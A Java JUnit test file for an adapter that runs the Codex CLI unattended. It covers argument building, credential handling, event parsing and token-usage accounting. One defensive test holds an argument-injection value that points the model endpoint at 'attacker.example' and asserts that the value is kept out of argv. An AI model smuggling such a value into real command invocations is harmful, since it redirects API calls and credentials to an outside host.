package dev.codespire.harness.codex;

import dev.codespire.harness.FailureCause;
import dev.codespire.harness.HarnessInvocation;
import dev.codespire.harness.HarnessType;
import dev.codespire.harness.PromptDelivery;
import dev.codespire.harness.RunEvent;
import dev.codespire.harness.RunEventSummary;
import dev.codespire.harness.TerminalOutcome;
import dev.codespire.harness.TokenBucket;
import dev.codespire.harness.UsageReport;
import org.junit.jupiter.api.Test;

import java.time.Duration;
import java.time.Instant;
import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertInstanceOf;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Every JSON fixture here is a line captured from a real {@code codex exec --json} run, not a shape
 * read from documentation. The plan this implements specified {@code {"type":"token_count",...}},
 * which the CLI does not emit — a test written from that would have passed against an adapter that
 * never extracted usage at all.
 */
class CodexAdapterTest {

    private final CodexAdapter adapter = new CodexAdapter();

    private HarnessInvocation invocation() {
        return new HarnessInvocation("run_abc", "fix the bug", "/workspace", "gpt-5.6",
                Map.of("OPENAI_API_KEY", "sk-secret"), Duration.ofMinutes(30));
    }

    // ---- invocation -------------------------------------------------------------------------

    @Test
    void theTypeIsCodex() {
        assertEquals(HarnessType.CODEX, adapter.type());
    }

    @Test
    void buildsTheVerifiedUnattendedInvocation() {
        List<String> argv = adapter.command(invocation());

        assertEquals("codex", argv.get(0));
        assertEquals("exec", argv.get(1));
        assertTrue(argv.contains("--json"), "the worker parses NDJSON, not prose");
        assertTrue(argv.contains("--skip-git-repo-check"));
        assertEquals("gpt-5.6", argv.get(argv.indexOf("--model") + 1));
        assertEquals("/workspace", argv.get(argv.indexOf("-C") + 1));

        // Verified against the binary: --ask-for-approval DOES NOT EXIST. An earlier draft of the
        // plan asserted it from documentation.
        assertFalse(argv.contains("--ask-for-approval"));

        // danger-full-access means "Codex adds no boundary of its own", not "there is no boundary".
        // Its sandbox is bubblewrap-based and cannot initialize under Docker's default seccomp
        // profile — and it does NOT fail fast when it can't, so any other value is a lie about the
        // security posture. The container is the boundary (ADR-038).
        assertEquals("danger-full-access", argv.get(argv.indexOf("--sandbox") + 1));
    }

    @Test
    void thePromptIsDeliveredOnStdinAndNeverAppearsInArgv() {
        // A work item is untrusted text. Codex's own parser reads a leading hyphen as an option and
        // -c overrides any config value, so a body of
        //   -c model_providers.openai.base_url=http://attacker.example/v1
        // would redirect the model call and the credential with it, with no shell anywhere.
        HarnessInvocation hostile = new HarnessInvocation("run_abc",
                "-c model_providers.openai.base_url=http://attacker.example/v1", "/workspace",
                "gpt-5.6", Map.of(), Duration.ofMinutes(30));

        List<String> argv = adapter.command(hostile);

        assertEquals(PromptDelivery.STDIN, adapter.promptDelivery());
        assertFalse(argv.contains(hostile.prompt()));
        assertFalse(String.join(" ", argv).contains("attacker.example"));

        // The trailing "-" is the prompt POSITION, telling Codex to read stdin. It is not the prompt.
        assertEquals("-", argv.get(argv.size() - 1));
    }

    @Test
    void theEnvironmentCarriesEveryCredentialAndArgvCarriesNone() {
        Map<String, String> env = adapter.environment(invocation());

        assertEquals("sk-secret", env.get("OPENAI_API_KEY"), "the child process needs the real value");
        assertEquals("1", env.get("CODEX_QUIET_MODE"));
        // argv is world-readable through /proc/<pid>/cmdline and echoed by docker inspect.
        assertFalse(String.join(" ", adapter.command(invocation())).contains("sk-secret"));
    }

    // ---- the real event vocabulary ----------------------------------------------------------

    @Test
    void parsesAnAgentMessageAsOutput() {
        RunEvent event = adapter.parse("""
                {"type":"item.completed","item":{"id":"item_0","type":"agent_message","text":"ACKNOWLEDGED"}}""")
                .orElseThrow();

        assertEquals("ACKNOWLEDGED", assertInstanceOf(RunEvent.Output.class, event).text());
    }

    @Test
    void parsesTheErrorEnvelopeAsAStateChange() {
        RunEvent event = adapter.parse("""
                {"type":"error","message":"Reconnecting... waiting for network"}""").orElseThrow();

        assertEquals("error", assertInstanceOf(RunEvent.StateChange.class, event).state());
    }

    @Test
    void anUnparseableLineIsSkippedRatherThanFatal() {
        assertTrue(adapter.parse("not json at all").isEmpty());
        assertTrue(adapter.parse("").isEmpty());
        assertTrue(adapter.parse("   ").isEmpty());
        assertTrue(adapter.parse(null).isEmpty());
        assertTrue(adapter.parse("[1,2,3]").isEmpty(), "valid JSON that is not an event object");
    }

    @Test
    void aCommandExecutionIsUseWhenStartedAndResultWhenCompleted() {
        // It arrives TWICE. Mapping both to ToolUse would double every shell command on the
        // operator's timeline and make a run look twice as busy as it was.
        RunEvent started = adapter.parse("""
                {"type":"item.started","item":{"id":"item_1","type":"command_execution",\
                "command":"ls -a","aggregated_output":"","exit_code":null,"status":"in_progress"}}""")
                .orElseThrow();
        RunEvent completed = adapter.parse("""
                {"type":"item.completed","item":{"id":"item_1","type":"command_execution",\
                "command":"ls -a","aggregated_output":"README.md","exit_code":0,"status":"completed"}}""")
                .orElseThrow();

        assertEquals("ls -a", assertInstanceOf(RunEvent.ToolUse.class, started).summary());
        RunEvent.ToolResult result = assertInstanceOf(RunEvent.ToolResult.class, completed);
        assertEquals("README.md", result.summary());
        assertFalse(result.error());
    }

    @Test
    void aFailedCommandIsMarkedAsAnError() {
        RunEvent event = adapter.parse("""
                {"type":"item.completed","item":{"id":"item_2","type":"command_execution",\
                "command":"false","aggregated_output":"","exit_code":1,"status":"completed"}}""")
                .orElseThrow();

        assertTrue(assertInstanceOf(RunEvent.ToolResult.class, event).error());
    }

    @Test
    void anInProgressCommandWithNoExitCodeHasNotFailed() {
        // exit_code is null while running. Reading absent-as-failure would paint every started
        // command red.
        RunEvent event = adapter.parse("""
                {"type":"item.completed","item":{"id":"item_3","type":"command_execution",\
                "command":"sleep 1","aggregated_output":"","exit_code":null,"status":"completed"}}""")
                .orElseThrow();

        assertFalse(assertInstanceOf(RunEvent.ToolResult.class, event).error());
    }

    @Test
    void modelControlledTextIsClippedBeforeItBecomesAnEvent() {
        // aggregated_output is whatever a model-chosen command printed, of unbounded length, and
        // every event becomes a row on an operator's timeline.
        String huge = "x".repeat(50_000);
        RunEvent event = adapter.parse("""
                {"type":"item.completed","item":{"type":"command_execution","command":"cat big",\
                "aggregated_output":"%s","exit_code":0}}""".formatted(huge)).orElseThrow();

        assertTrue(assertInstanceOf(RunEvent.ToolResult.class, event).summary().length() < 3_000);
    }

    // ---- usage ------------------------------------------------------------------------------

    @Test
    void extractsUsageFromTheRealTurnCompletedShape() {
        // Captured verbatim from a live run. Codex is OpenAI: cached_input_tokens is a SUBSET of
        // input_tokens, so 14064/9984 is a 14064-token call, not a 24048-token one. Writing both
        // raw inflates by the cache-hit rate — worst on the runs that were cheapest.
        RunEvent event = adapter.parse("""
                {"type":"turn.completed","usage":{"input_tokens":14064,"cached_input_tokens":9984,\
                "cache_write_input_tokens":0,"output_tokens":8,"reasoning_output_tokens":0}}""")
                .orElseThrow();

        UsageReport report = adapter.usage(RunEventSummary.of(List.of(event)));

        assertFalse(report.isUnknown());
        assertEquals(4_080L, report.tokens(TokenBucket.INPUT), "input minus the cached subset");
        assertEquals(9_984L, report.tokens(TokenBucket.CACHED_INPUT));
        assertEquals(0L, report.tokens(TokenBucket.CACHE_WRITE));
        assertEquals(8L, report.tokens(TokenBucket.OUTPUT));
        assertEquals(0L, report.tokens(TokenBucket.REASONING));

        long partitioned = report.tokens(TokenBucket.INPUT) + report.tokens(TokenBucket.CACHED_INPUT)
                + report.tokens(TokenBucket.OUTPUT) + report.tokens(TokenBucket.REASONING);
        assertEquals(14_072L, partitioned, "the partition must sum to input + output, not exceed it");
    }

    @Test
    void reasoningIsSubtractedFromOutput() {
        RunEvent event = adapter.parse("""
                {"type":"turn.completed","usage":{"input_tokens":100,"cached_input_tokens":0,\
                "cache_write_input_tokens":0,"output_tokens":50,"reasoning_output_tokens":30}}""")
                .orElseThrow();

        UsageReport report = adapter.usage(RunEventSummary.of(List.of(event)));

        assertEquals(20L, report.tokens(TokenBucket.OUTPUT));
        assertEquals(30L, report.tokens(TokenBucket.REASONING));
    }

    @Test
    void aRunThatReportedNoUsageIsUnknownNotZero() {
        UsageReport report = adapter.usage(RunEventSummary.of(List.of()));

        assertTrue(report.isUnknown(), "no usage event means UNKNOWN — the ledger must refuse to price it");
    }

    @Test
    void aTurnCompletedWithoutAUsageBlockIsUnknown() {
        assertTrue(adapter.parse("""
                {"type":"turn.completed"}""").isEmpty());
    }

    @Test
    void aNegativeVendorCountIsRejectedRatherThanStored() {
        // A buggy OpenAI-compatible proxy once dead-lettered a paid review this way.
        assertTrue(adapter.parse("""
                {"type":"turn.completed","usage":{"input_tokens":-1,"output_tokens":10}}""").isEmpty(),
                "a negative count is not a measurement; drop the event, keep the run");
    }

    @Test
    void contradictoryCountsDegradeToAnUnreconciledTotal() {
        // Codex reports no total, so there is no independent arithmetic to check a split against.
        // When the vendor's own numbers contradict each other, report the headline total as the
        // degraded case rather than flooring a subtraction to zero and calling it a breakdown.
        RunEvent event = adapter.parse("""
                {"type":"turn.completed","usage":{"input_tokens":100,"cached_input_tokens":150,\
                "output_tokens":10,"reasoning_output_tokens":0}}""").orElseThrow();

        UsageReport report = adapter.usage(RunEventSummary.of(List.of(event)));

        assertEquals(110L, report.tokens(TokenBucket.TOTAL));
        assertEquals(0L, report.tokens(TokenBucket.INPUT), "no split is offered alongside a TOTAL");
    }

    @Test
    void usageTakesTheLastTurnNotTheFirst() {
        // Each turn.completed carries that turn's cumulative totals, not an increment. Summing them
        // would multiply a multi-turn run's cost by roughly the number of turns.
        RunEvent early = adapter.parse("""
                {"type":"turn.completed","usage":{"input_tokens":100,"output_tokens":10}}""").orElseThrow();
        RunEvent late = adapter.parse("""
                {"type":"turn.completed","usage":{"input_tokens":900,"output_tokens":45}}""").orElseThrow();

        UsageReport report = adapter.usage(new RunEventSummary(List.of(early, late), true));

        assertEquals(900L, report.tokens(TokenBucket.INPUT));
        assertEquals(45L, report.tokens(TokenBucket.OUTPUT));
    }

    // ---- classification ---------------------------------------------------------------------

    @Test
    void aCleanExitSucceeds() {
        assertTrue(adapter.classify(0, RunEventSummary.of(List.of())).succeeded());
    }

    @Test
    void aNonZeroExitWithNoOutputIsNoModelResponse() {
        // The 2026-08-28 incident: a reasoning model spent its whole budget thinking and returned
        // nothing. A distinct, nameable failure — reported as a generic non-zero exit it reads as
        // an infrastructure fault and the operator looks in the wrong place.
        TerminalOutcome outcome = adapter.classify(1, new RunEventSummary(List.of(), false));

        assertEquals(FailureCause.NO_MODEL_RESPONSE, outcome.cause().orElseThrow());
    }

    @Test
    void aNonZeroExitAfterOutputIsAHarnessFailure() {
        RunEventSummary spoke = RunEventSummary.of(
                List.of(new RunEvent.Output(Instant.now(), "partial")));

        assertEquals(FailureCause.HARNESS_EXIT_NONZERO,
                adapter.classify(1, spoke).cause().orElseThrow());
    }
}
